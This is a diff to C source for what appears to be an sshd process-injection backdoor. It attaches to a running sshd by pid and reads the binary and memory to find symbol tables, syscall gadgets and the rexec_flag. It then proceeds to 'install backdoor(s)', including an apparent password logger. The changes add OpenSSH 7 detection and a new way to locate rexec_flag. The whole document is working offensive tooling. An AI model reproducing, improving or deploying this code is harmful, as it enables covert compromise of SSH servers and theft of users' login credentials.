@@ -20,12 +20,13 @@
 #include <backdoor_menu.h>
 
 void inject_ctx_init(inject_ctx *ctx, pid_t pid) {
+	int i;
 	char sshd_path[255], proc_exe[64];
 
 	info("you gave me pid %d\n", pid);
 
 	ctx->pid = pid;
-	ctx->debug = 0;
+	ctx->debug = 1;
 	_attach(ctx->pid);
 
 	info("slurping stuff to memory..");
@@ -46,27 +47,42 @@ void inject_ctx_init(inject_ctx *ctx, pid_t pid) {
 	readlink(proc_exe, sshd_path, 255);
 	info("sshd binary path = '%s'", sshd_path);
 
+	// check if OpenSSH version is >= 7
+	FILE *f = fopen(sshd_path, "rb");
+
+	fseek(f, 0, SEEK_END);
+	int sz = ftell(f);
+	fseek(f, 0, SEEK_SET);
+
+	char *sshd_buf = malloc(sz);
+	fread(sshd_buf, sz, 1, f);
+	fclose(f);
+
+	ctx->is_openssh7 = 0;
+
+	for(i = 0; i < sz; i++) {
+		if (memcmp(sshd_buf + i, "OpenSSH_7", 9) == 0) {
+			ctx->is_openssh7 = 1;
+			break;
+		}
+	}
+
+	free(sshd_buf);
+
 	// locate syscall instruction
 	ctx->sc_addr = find_sig_mem(ctx, (u8*)"\x0f\x05", 2, MEM_R | MEM_X);
 	info("syscall\t\t\t= \x1b[37m0x%lx", ctx->sc_addr);
 
 	// load symtabs
 	ctx->dynsym_sz = get_section(sshd_path, ".dynsym", &ctx->dynsym, &ctx->dynsym_base);
-	// if (ctx->dynsym != 0) { printf("## DYNSYM:\n"); hexdump(ctx->dynsym, ctx->dynsym_sz); }
-
 	ctx->dynstr_sz = get_section(sshd_path, ".dynstr", &ctx->dynstr, &ctx->dynstr_base);
-	// if (ctx->dynstr != 0) { printf("## DYNSTR:\n"); hexdump(ctx->dynstr, ctx->dynstr_sz); }
-
 	ctx->symtab_sz = get_section(sshd_path, ".symtab", &ctx->symtab, &ctx->symtab_base);
-	//if (ctx->symtab != 0) { printf("## SYMTAB:\n"); hexdump(ctx->symtab, ctx->symtab_sz); }
-
 	ctx->strtab_sz = get_section(sshd_path, ".strtab", &ctx->strtab, &ctx->strtab_base);
-	//if (ctx->strtab != 0) { printf("## STRTAB:\n"); hexdump(ctx->strtab, ctx->strtab_sz); }
-
 	ctx->got_sz    = get_section(sshd_path, ".got",    &ctx->got,    &ctx->got_base);
-	//if (ctx->got != 0) { printf("## GOT:\n"); hexdump(ctx->got, ctx->got_sz); }
-
     ctx->rela_sz   = get_section(sshd_path, ".rela.plt",    &ctx->rela,    &ctx->rela_base);
+
+	// cache all call instructions in executable regions
+	cache_calltable(ctx);
 }
 
 void inject_ctx_deinit(inject_ctx *ctx) {
@@ -87,21 +103,45 @@ u64 inject_resolve_rexec(inject_ctx *ctx) {
 	if (rexec_flag == 0) {
 		u64 rexec_debug_lea = 0, rexec_test = 0;
 		u32 rexec_flag_offset = 0;
-		
-		info("could not resolve rexec_flag :(, trying alternative method..");
-		
+
+		if (ctx->debug)
+			info("could not resolve rexec_flag :(, trying alternative method..");
+
 		rexec_debug_lea = lea_by_debugstr(
 			ctx, LEA_RDI, "Server will not fork when running in debugging mode."
 		);
-		
-		// Find the first 'test eax, eax' instruction after the debug string
-		rexec_test = find_next_opcode(ctx, rexec_debug_lea, (u8*)"\x85\xc0", 2);
 
-		// Get the rexec_flag offset from rip		
-		_peek(ctx->pid, rexec_test - 4, &rexec_flag_offset, 4);
-		
-		// Resolve absolute address of rip + rexec_flag_offset
-		rexec_flag = rexec_test + rexec_flag_offset;
+		// find first call to getpid() from here
+		u64 p_getpid = plt_by_name(ctx, "getpid");
+
+		if (ctx->debug)
+			info("getpid@plt = 0x%lx", p_getpid);
+
+		u64 adr = find_nearest_call(rexec_debug_lea, p_getpid);
+
+		// next opcode is "cmp cs:???, 0 ?
+		unsigned char opbytes[2];
+		_peek(ctx->pid, adr+5, opbytes, 2);
+
+		if (memcmp(opbytes, "\x83\x3d", 2) == 0) {
+			if (ctx->debug)
+				info("found cmp:cs opcode..");
+
+			_peek(ctx->pid, adr+5+2, &rexec_flag_offset, 4);
+			rexec_flag = adr+5+7+rexec_flag_offset;
+		} else { // finally.. old method
+			if (ctx->debug)
+				info("trying final method..");
+
+			// Find the first 'test eax, eax' instruction after the debug string
+			rexec_test = find_next_opcode(ctx, rexec_debug_lea, (u8*)"\x85\xc0", 2);
+
+			// Get the rexec_flag offset from rip
+			_peek(ctx->pid, rexec_test - 4, &rexec_flag_offset, 4);
+
+			// Resolve absolute address of rip + rexec_flag_offset
+			rexec_flag = rexec_test + rexec_flag_offset;
+		}
 	}
 
 	return rexec_flag;
@@ -181,8 +221,6 @@ int main(int argc, char *argv[]) {
 	u64 rexec_flag = inject_resolve_rexec(ctx);
 	info("rexec_flag\t\t\t= 0x%lx", rexec_flag); 
 
-	// cache all call instructions in executable regions
-	cache_calltable(ctx);
 
 	// install backdoor(s)
 	if(passlog_path != NULL) {
